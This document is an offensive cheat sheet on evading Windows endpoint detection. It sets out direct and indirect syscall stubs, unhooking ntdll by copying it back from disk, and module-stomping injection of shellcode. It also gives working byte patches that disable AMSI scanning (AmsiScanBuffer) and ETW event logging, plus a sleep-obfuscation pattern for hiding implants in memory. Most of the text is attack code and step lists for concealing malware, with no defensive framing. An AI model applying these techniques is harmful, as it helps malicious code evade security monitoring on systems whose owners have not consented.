# Syscall, Unhooking, and Behavioral Bypass

## Why EDRs Hook

EDRs inject a DLL into every process and overwrite the first bytes of monitored ntdll exports (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.) with a JMP to their analysis code.

## Direct Syscall

Bypass user-mode hooks by calling the syscall instruction directly, skipping ntdll entirely.

```asm
; x64 direct syscall stub for NtAllocateVirtualMemory (SSN varies by Windows build)
NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, SSN          ; syscall service number
    syscall
    ret
```

```c
// Get SSN dynamically from ntdll on disk (not hooked)
DWORD GetSyscallNumber(const char* funcName) {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
    // map, find export, read 4th byte of stub (mov eax, SSN)
    // return SSN
}
```

## Indirect Syscall

Execute syscall from inside ntdll to pass stack-trace checks (some EDRs verify call stack).

```c
// 1. Find "syscall; ret" gadget inside ntdll
// 2. Set up registers for target function
// 3. JMP to gadget address
```

## Manual ntdll Unhooking

```c
// Load a clean copy of ntdll from disk, overwrite .text section in memory
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// Map file -> compare .text section -> restore original bytes over hooked pages
// Change page protection to RWX before writing, restore to RX after
```

## AMSI Bypass

```c
// Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
// Find AmsiScanBuffer in amsi.dll
// Overwrite first bytes: mov eax, 0x80070057; ret
unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pAmsiScanBuffer, patch, sizeof(patch));
VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &dummy);
```

## ETW Bypass

```c
// Patch EtwEventWrite to return immediately
// NtTraceEvent -> patch first byte to C3 (ret)
unsigned char ret = 0xC3;
WriteProcessMemory(GetCurrentProcess(), pEtwEventWrite, &ret, 1, NULL);
```

## Sleep Obfuscation

Encrypt shellcode/implant in memory during sleep, decrypt before execution resumes.

```c
// Ekko / Foliage pattern:
// 1. Create timer queue
// 2. Schedule: ROP chain that: encrypts .text section → Sleep(delay) → decrypts .text section
// 3. Implant appears as encrypted garbage during sleep scan
```

## Process Injection (Low Noise)

```c
// Module stomping: overwrite legitimate DLL mapped in target process
// 1. OpenProcess(target)
// 2. Find mapped copy of a rarely-used DLL (e.g. xpsservices.dll)
// 3. VirtualProtect that region to RWX
// 4. WriteProcessMemory shellcode
// 5. CreateRemoteThread / QueueUserAPC to that region
```
